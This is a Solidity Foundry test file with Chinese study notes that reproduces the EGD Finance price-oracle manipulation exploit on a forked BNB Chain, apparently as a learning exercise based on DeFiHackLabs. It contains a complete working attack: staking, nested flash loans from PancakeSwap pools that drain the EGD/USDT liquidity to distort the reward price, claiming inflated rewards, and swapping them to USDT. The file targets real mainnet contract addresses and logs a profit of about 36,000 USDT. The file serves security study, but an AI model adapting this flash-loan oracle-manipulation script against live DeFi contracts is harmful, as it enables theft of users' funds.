// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./interface.sol";
  
interface IEGD_Finance {
    function bond(address invitor) external;
    function stake(uint256 amount) external;
    function calculateAll(address addr) external view returns (uint256);
    function claimAllReward() external;
    function getEGDPrice() external view returns (uint256);
}

IPancakePair constant POOL_USDT_BSC_PANCAKE = IPancakePair(address(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE));
IPancakePair constant POOL_USDT_EGD_PANCAKE = IPancakePair(address(0xa361433E409Adac1f87CDF133127585F8a93c67d));
IPancakeRouter constant SWAP_ROUNTER_PANCAKE = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
IEGD_Finance constant FINANCE = IEGD_Finance(address(0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370));

address constant TOKEN_USDT = address(0x55d398326f99059fF775485246999027B3197955);
address constant TOKEN_EGD = address(0x202b233735bF743FA31abb8f71e641970161bF98);


/*  

$ forge test -vvv
Running 1 test for test/EGD_exp_copy.t.sol:Attacker
[PASS] testExploit() (gas: 3575280)
Logs:
  before exploit usdt balance:  0
  second flash loan pay back :  true
  first flash loan pay back :  true
  after exploit usdt balance:  36152915446991996902763

这个是仿照写的 学到了一些套路  模拟假环境 充钱
通过 Phalcon  查看大致发生了什么  然后重现步骤  
这个就是典型的预言机价格操控  EGD Finance 使用了 pancake 里面的价格作为实时价格 
黑客先搞100刀 在里面stake  然后去BSC_USDT 借2000刀 
然后再闪电贷  在 EGD_USDT 几乎抽干了流动性  这样就影响了 预言机的价格 
claimAllReward 使用的就是这个价格   提取出了很多 EGD token 
最后再通过 pancake 把 token 换成 usdt  提出来  获利跑路

学到的知识点:
    1. Foundry cheatcodes 
            createSelectFork: 指定這次測試要複製哪個網路和區塊高度，注意每條鏈的 RPC 要寫在 foundry.toml
            deal: 設定測試錢包餘額  
                設定 ETH 餘額 deal(address(this), 3 ether);
                設定 Token 餘額 deal(address(USDC), address(this), 1 * 1e18);
            prank: 模擬指定錢包身份，只有在下一個呼叫有效，下一個 msg.sender 是會所指定的錢包，例如使用巨鯨錢包轉帳
            startPrank: 模擬指定錢包身份，在沒有執行stopPrank()之前，所有 msg.sender 都會是指定的錢包地址
            label: 將錢包地址標籤化，方便在使用 Foundry debug 時提高可讀性
            roll: 調整區塊高度
            warp: 調整 block.timestamp

    2. IERC-20的使用套路 approval - transfer 

    3. 闪电贷 可以 再套一层  闪电贷-闪电贷  通过 calldata 来区分是哪一个

参考:
    https://phalcon.xyz/tx/bsc/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3
    https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/academy/onchain_debug/03_write_your_own_poc/
    https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/EGD-Finance.exp.sol


那么如何避免这种事情呢? 

*/
contract Attacker is Test {

    function setUp() public {
       vm.createSelectFork("https://bsc-dataseed4.defibit.io/", 20_245_522);
       vm.label(address(POOL_USDT_EGD_PANCAKE), "POOL_USDT_EGD_PANCAKE");
       vm.label(address(POOL_USDT_BSC_PANCAKE), "POOL_USDT_BSC_PANCAKE");
       vm.label(address(SWAP_ROUNTER_PANCAKE), "SWAP_ROUNTER_PANCAKE");
       vm.label(address(FINANCE), "FINANCE");

       vm.label(TOKEN_USDT, "TOKEN_USDT");
       vm.label(TOKEN_EGD, "TOKEN_EGD");
    }

    function testExploit() public {
        
        Exploit exploit = new Exploit();
        exploit.stake();
        vm.warp(1659914146);

        exploit.harvest();
    }
}

contract Exploit is Test{
    uint borrow1;
    uint borrow2;

    function stake() public{
        deal(address(TOKEN_USDT), address(this), 100 ether);
        FINANCE.bond(address(0x659b136c49Da3D9ac48682D02F7BD8806184e218));
        
        IERC20(TOKEN_USDT).approve(address(FINANCE), 100 ether);
        FINANCE.stake(100 ether);
    }

    function harvest() public{
        console2.log("before exploit usdt balance: ", IERC20(TOKEN_USDT).balanceOf(address(this)));
        borrow1 = 2_000 * 1e18;
        // 1 
        POOL_USDT_BSC_PANCAKE.swap(borrow1, 0, address(this), "0000");

        console2.log("after exploit usdt balance: ", IERC20(TOKEN_USDT).balanceOf(address(this)));
        // 6 
        IERC20(TOKEN_USDT).transfer(msg.sender, IERC20(TOKEN_USDT).balanceOf(address(this)));
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        if(keccak256(data) == keccak256("0000")){
            // 2 
            borrow2 = IERC20(TOKEN_USDT).balanceOf(address(POOL_USDT_EGD_PANCAKE)) * 9_999_999_925 / 10_000_000_000;
            POOL_USDT_EGD_PANCAKE.swap(0, borrow2, address(this), "00");

            // 4 
            address[] memory path = new address[](2);
            path[0] = TOKEN_EGD;
            path[1] = TOKEN_USDT; 
            IERC20(TOKEN_EGD).approve(address(SWAP_ROUNTER_PANCAKE), type(uint256).max);
            SWAP_ROUNTER_PANCAKE.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                IERC20(TOKEN_EGD).balanceOf(address(this)), 1, path, address(this), block.timestamp
            );

            // 5
            uint fee = borrow1 * 5 / 1_000;
            bool suc = IERC20(TOKEN_USDT).transfer(address(POOL_USDT_BSC_PANCAKE), borrow1 + fee);
            console2.log("first flash loan pay back : ", suc);
            require(suc, "first flash loan failed");
        }

        if(keccak256(data) == keccak256("00")){
            // 3 
            FINANCE.claimAllReward();
            uint fee = borrow2 * 3 / 1_000;
            bool suc = IERC20(TOKEN_USDT).transfer(address(POOL_USDT_EGD_PANCAKE), borrow2 + fee);   // pay back flash loan 
            console2.log("second flash loan pay back : ", suc);
            require(suc, "second flash loan failed");
        }
    }
}
